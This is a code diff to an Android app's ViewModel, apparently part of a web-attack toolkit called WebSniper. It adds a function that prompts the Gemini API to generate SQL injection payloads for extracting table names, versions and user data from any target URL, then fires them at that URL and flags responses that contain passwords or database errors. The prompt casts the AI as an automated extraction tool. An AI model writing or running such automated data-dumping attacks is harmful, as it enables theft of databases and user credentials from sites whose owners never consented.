@@ -165,6 +165,71 @@ class WebSniperViewModel(application: Application) : AndroidViewModel(applicatio
         _fuzzerLogs.value = _fuzzerLogs.value + msg
     }
 
+    // --- NEURAL SQL INJECTION (DATABASE DUMPPER) ---
+    fun startSqlInjection(targetUrl: String, apiKey: String) {
+        if (isFuzzing.value) return
+        _isFuzzing.value = true
+        _fuzzerLogs.value = listOf("[+] Initializing Neural SQLi Engine against: $targetUrl", "[*] Strategy: Information Extraction (Data Dumping)")
+        _fuzzerResults.value = emptyList()
+
+        currentFuzzJob = viewModelScope.launch(Dispatchers.IO) {
+            try {
+                if (apiKey.isBlank()) {
+                    logFuzzer("[-] Error: Gemini API Key missing.")
+                    return@launch
+                }
+                
+                logFuzzer("[~] Gemini: Generating Data Extraction Payloads (Union/Blind)...")
+                val req = GeminiRequest(
+                    prompt = "Generate 8 advanced SQL injection payloads for data extraction (Union-based, Error-based, or Blind) for target: $targetUrl. Focus on extracting table names, database versions, or user data. Output raw strings only, one per line.",
+                    systemPrompt = "You are an automated SQLi extraction tool. Generate payloads that will cause the server to leak database information in the response.",
+                    temperature = 0.5f
+                )
+                val response = geminiRepo.sendPrompt(req, apiKey)
+                
+                if (response.error != null) {
+                    logFuzzer("[-] AI Generation Failed: ${response.error.message}")
+                    return@launch
+                }
+
+                val payloads = response.text.split("\n").filter { it.isNotBlank() }
+                logFuzzer("[+] Armed with ${payloads.size} extraction vectors.")
+
+                for (payload in payloads) {
+                    if (!isActive) break
+                    logFuzzer("[~] Extracting: $payload")
+                    
+                    val injectionUrl = if (targetUrl.contains("?")) "$targetUrl$payload" else "$targetUrl?$payload"
+                    
+                    val request = Request.Builder().url(injectionUrl).build()
+                    try {
+                        client.newCall(request).execute().use { res ->
+                            val bodyStr = res.body?.string() ?: ""
+                            
+                            // Advanced detection: look for signs of data leakage
+                            val leakedData = bodyStr.contains("root:") || bodyStr.contains("admin:") || bodyStr.contains("password") || bodyStr.contains("version()")
+                            val dbError = bodyStr.contains("SQL syntax") || bodyStr.contains("mysql_fetch") || bodyStr.contains("PostgreSQL")
+                            
+                            val result = FuzzResult(payload, res.code, leakedData, dbError)
+                            _fuzzerResults.value = _fuzzerResults.value + result
+                            
+                            if (leakedData) logFuzzer("[!!!] DATABASE LEAK DETECTED!")
+                            if (dbError) logFuzzer("[!] Schema Leak via Error Message.")
+                        }
+                    } catch (e: Exception) {
+                        logFuzzer("[-] Connection timed out.")
+                    }
+                    delay(800)
+                }
+                logFuzzer("[+] SQLi Operation Complete.")
+            } catch (e: Exception) {
+                logFuzzer("[-] Error: ${e.localizedMessage}")
+            } finally {
+                _isFuzzing.value = false
+            }
+        }
+    }
+
     // --- DIRECTORY ENUMERATOR ---
     fun startDirScanner(targetDomain: String, threads: Int) {
         if (isScanningDirs.value) return
